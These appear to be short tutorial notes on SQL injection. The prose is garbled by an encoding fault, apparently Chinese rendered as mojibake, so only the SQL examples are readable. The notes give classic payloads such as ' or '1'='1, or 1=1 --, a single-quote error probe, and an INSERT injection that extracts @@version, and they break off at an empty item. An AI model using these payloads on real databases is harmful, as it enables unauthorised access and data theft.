SQLע��
Sql������͵Ŀ���
	һ����ѯ��ɾ����
	Select * from tablea where x= '12';
	Select * from tablea where x= 12 ;
	1.�ַ������룺12 ' or '1'='1  ==> Select * from tablea where x= ' 12 ' or '1'='1 ';
	�����룺      12' or 1=1 --  ==> Select * from tablea where x= ' 12' or 1=1 -- '
	2.���������룺12 or 1=1 ==>  Select * from tablea where x= 12 or 1=1   
	�����룺      12 or 1=1-- ==> Select * from tablea where x= 12 or 1=1 --
	�����ʾ���ȳ������ƣ��򲻴��ڷ���
	3.���룺' ==> Select * from tablea where x= ' 
	�����ʾYou have an error in your SQL syntax�����ע����գ�������Ϊ�ջ���ʾ�Ҳ���...�򲻴��ڷ���
	�������빦�ܺ��޸ģ�
	insert into table (col1,col2) values ('foo','bar');
	insert into users (name,age) values ('foo',10)
	1.�ַ������룺d'+substring((select @@version),1,1)+'  ==> insert into table (col1,col2) values ('foo',' d'+substring((select @@version),1,1)+' ');
	2.���������룺